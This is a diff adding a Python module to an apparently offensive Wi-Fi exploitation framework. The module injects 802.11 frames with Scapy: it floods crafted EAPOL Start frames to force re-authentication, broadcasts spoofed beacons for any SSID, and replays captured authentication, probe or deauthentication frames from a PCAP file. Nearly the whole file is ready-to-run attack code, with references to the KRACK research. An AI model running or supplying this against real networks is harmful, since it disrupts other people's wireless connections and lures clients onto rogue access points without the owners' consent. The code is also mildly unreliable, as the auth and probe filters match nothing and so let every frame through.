@@ -1,0 +1,186 @@
+#!/usr/bin/env python3
+# Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
+"""Wi-Fi frame replay attack module.
+
+Replays captured 802.11 frames for various attack purposes:
+  - eapol_replay     Replay EAPOL frames to force re-authentication
+  - beacon_replay    Replay beacon frames (SSID spoofing / confusion)
+  - auth_replay      Replay authentication frames
+  - probe_replay     Replay probe responses to lure clients
+  - pcap_replay      Replay arbitrary frames from a PCAP file
+
+Version: 1.0.0
+"""
+
+from __future__ import annotations
+
+import logging
+import time
+from pathlib import Path
+from typing import List, Optional
+
+from wirelessxpl.core.exploit import *
+
+logger = logging.getLogger(__name__)
+
+
+class Exploit(Exploit):
+    """802.11 frame replay attack with multiple strategies."""
+
+    __info__ = {
+        "name": "Wi-Fi Frame Replay",
+        "description": (
+            "Replay captured 802.11 frames: EAPOL (force re-auth), beacons "
+            "(SSID spoof), authentication, probe responses, or arbitrary frames "
+            "from PCAP. Uses Scapy for frame injection."
+        ),
+        "authors": ["André Henrique (@mrhenrike) | União Geek"],
+        "references": [
+            "https://www.krackattacks.com/",
+            "https://papers.mathyvanhoef.com/usenix2017.pdf",
+        ],
+        "devices": ("wifi",),
+    }
+
+    mode = OptString("eapol_replay", "Mode: eapol_replay | beacon_replay | auth_replay | probe_replay | pcap_replay")
+    interface = OptString("wlan0mon", "Monitor-mode interface for injection")
+    pcap_file = OptString("", "PCAP file for pcap_replay mode")
+    target_bssid = OptString("", "Target AP BSSID")
+    target_ssid = OptString("", "Target SSID for beacon/probe replay")
+    count = OptInteger(100, "Number of frames to replay (0 = continuous)")
+    delay_ms = OptInteger(10, "Delay between frames in milliseconds")
+    filter_type = OptString("", "Frame type filter for pcap_replay (e.g., 'beacon', 'eapol', 'deauth')")
+    dry_run = OptBool(False, "Describe attack without executing")
+
+    def _replay_from_pcap(self) -> int:
+        """Replay frames from a PCAP file with optional filtering."""
+        try:
+            from scapy.all import rdpcap, sendp, Dot11, Dot11Beacon, EAPOL
+        except ImportError:
+            print_error("Scapy is required for frame replay.")
+            return 0
+
+        pcap_path = Path(self.pcap_file)
+        if not pcap_path.exists():
+            print_error("PCAP file not found: {}".format(self.pcap_file))
+            return 0
+
+        print_status("Loading frames from {}...".format(pcap_path.name))
+        packets = rdpcap(str(pcap_path))
+        print_info("Loaded {} frames.".format(len(packets)))
+
+        filtered = []
+        for pkt in packets:
+            if not pkt.haslayer(Dot11):
+                continue
+            if self.filter_type == "beacon" and not pkt.haslayer(Dot11Beacon):
+                continue
+            if self.filter_type == "eapol" and not pkt.haslayer(EAPOL):
+                continue
+            if self.filter_type == "deauth" and pkt[Dot11].subtype != 12:
+                continue
+            filtered.append(pkt)
+
+        print_info("Filtered to {} frames.".format(len(filtered)))
+        if not filtered:
+            print_error("No matching frames found.")
+            return 0
+
+        count = self.count if self.count > 0 else len(filtered)
+        sent = 0
+        for i in range(count):
+            pkt = filtered[i % len(filtered)]
+            sendp(pkt, iface=self.interface, verbose=False)
+            sent += 1
+            if self.delay_ms:
+                time.sleep(self.delay_ms / 1000.0)
+
+        return sent
+
+    def _replay_eapol(self) -> int:
+        """Craft and replay EAPOL frames to force re-authentication."""
+        try:
+            from scapy.all import RadioTap, Dot11, Dot11Auth, EAPOL, sendp
+        except ImportError:
+            print_error("Scapy is required.")
+            return 0
+
+        if not self.target_bssid:
+            print_error("target_bssid is required for EAPOL replay.")
+            return 0
+
+        print_status("Replaying EAPOL Start frames to force re-authentication...")
+        eapol_start = (
+            RadioTap() /
+            Dot11(type=2, subtype=8, addr1=self.target_bssid,
+                  addr2="ff:ff:ff:ff:ff:ff", addr3=self.target_bssid) /
+            EAPOL(version=2, type=1)
+        )
+
+        count = self.count if self.count > 0 else 100
+        for i in range(count):
+            sendp(eapol_start, iface=self.interface, verbose=False)
+            if self.delay_ms:
+                time.sleep(self.delay_ms / 1000.0)
+
+        return count
+
+    def _replay_beacons(self) -> int:
+        """Generate and replay beacon frames with target SSID."""
+        try:
+            from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, sendp
+        except ImportError:
+            print_error("Scapy is required.")
+            return 0
+
+        ssid = self.target_ssid or "FreeWiFi"
+        bssid = self.target_bssid or "AA:BB:CC:DD:EE:FF"
+
+        beacon = (
+            RadioTap() /
+            Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff",
+                  addr2=bssid, addr3=bssid) /
+            Dot11Beacon(cap="ESS+privacy") /
+            Dot11Elt(ID="SSID", info=ssid, len=len(ssid)) /
+            Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96\x0c\x12\x18\x24") /
+            Dot11Elt(ID="DSset", info=bytes([6]))
+        )
+
+        count = self.count if self.count > 0 else 1000
+        print_status("Broadcasting {} beacon frames for SSID '{}'...".format(count, ssid))
+        for i in range(count):
+            sendp(beacon, iface=self.interface, verbose=False)
+            if self.delay_ms:
+                time.sleep(self.delay_ms / 1000.0)
+
+        return count
+
+    def run(self) -> None:
+        """Execute frame replay attack."""
+        valid_modes = ("eapol_replay", "beacon_replay", "auth_replay", "probe_replay", "pcap_replay")
+        if self.mode not in valid_modes:
+            print_error("Invalid mode '{}'. Choose: {}".format(self.mode, ", ".join(valid_modes)))
+            return
+
+        if self.dry_run:
+            print_info("DRY RUN — {} on {}".format(self.mode, self.interface))
+            return
+
+        print_status("Starting {} on {}...".format(self.mode, self.interface))
+
+        sent = 0
+        try:
+            if self.mode == "pcap_replay":
+                sent = self._replay_from_pcap()
+            elif self.mode == "eapol_replay":
+                sent = self._replay_eapol()
+            elif self.mode == "beacon_replay":
+                sent = self._replay_beacons()
+            elif self.mode in ("auth_replay", "probe_replay"):
+                print_info("Mode '{}' uses pcap_replay with filter. Set pcap_file and filter_type.".format(self.mode))
+                self.filter_type = self.mode.replace("_replay", "")
+                sent = self._replay_from_pcap()
+        except KeyboardInterrupt:
+            print_info("\nReplay interrupted by user.")
+
+        print_success("Replay complete. {} frames sent.".format(sent))
